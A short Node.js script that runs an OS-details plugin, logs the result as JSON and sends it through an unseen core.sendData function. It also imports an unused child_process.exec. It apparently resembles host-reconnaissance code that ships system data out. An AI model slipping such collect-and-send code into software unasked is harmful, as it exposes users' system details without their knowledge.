const { exec } = require("child_process");
const core = require("./core");

const plugins = [
    {
        key: "os",
        plugin: require("./plugins/getOsDetails")
    }
];

async function runPlugin({key, plugin}) {
    return {
        [key]: await plugin()
    }
}

runPlugin(plugins[0]).then(data => {
    let postData = JSON.stringify(data, null, 2);
    console.log("Sending data:", postData);
    core.sendData(postData);
});
